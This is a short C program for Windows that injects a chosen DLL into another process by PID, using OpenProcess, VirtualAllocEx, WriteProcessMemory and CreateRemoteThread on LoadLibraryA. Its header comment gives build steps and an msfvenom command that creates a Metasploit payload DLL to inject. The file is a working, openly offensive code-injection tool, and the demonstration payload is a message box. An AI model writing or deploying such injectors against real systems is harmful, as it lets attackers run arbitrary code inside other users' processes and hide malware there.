/*
wine gcc -m32 inject_dll.c
make dll: msfvenom -p windows/messagebox -b '\x00' -f dll -a x86 --platform Windows > hello.dll
call with inject_dll.exe file.dll pid
*/

#include <Windows.h>
#include <WinCrypt.h>
#include <conio.h>
#include <stdio.h>
#include <tlhelp32.h>

#define CREATE_THREAD_ACCESS (PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)

DWORD InjectDLL(PCHAR pDll, DWORD dwProcessID) 
{
	HANDLE hProc;
	HANDLE hRemoteThread;
	LPVOID pRemoteBuffer;
	LPVOID pLoadLibAddr;

	if(!dwProcessID) {
		return 1;
	}
	hProc = OpenProcess(CREATE_THREAD_ACCESS, FALSE, dwProcessID);
	if(!hProc) {
		return 2;
	}

	pLoadLibAddr = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
	if (!pLoadLibAddr) {
		return 3;
	}
	pRemoteBuffer = VirtualAllocEx(hProc, NULL, strlen(pDll), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
	if (!pRemoteBuffer) {
		return 4;
	}

	if (!WriteProcessMemory(hProc, pRemoteBuffer, pDll, strlen(pDll), NULL)) {
		return 5;
	}
	hRemoteThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibAddr, pRemoteBuffer, 0, NULL);
	if (!hRemoteThread) {
		return 6;
	}
	CloseHandle(hProc);
	return 0;
}

int main(int argc, char* argv[]) 
{
	CHAR pDllPath[5000] = "";
	GetFullPathNameA(argv[1], 5000, pDllPath, NULL);
	return InjectDLL(pDllPath, atoi(argv[2]));
}

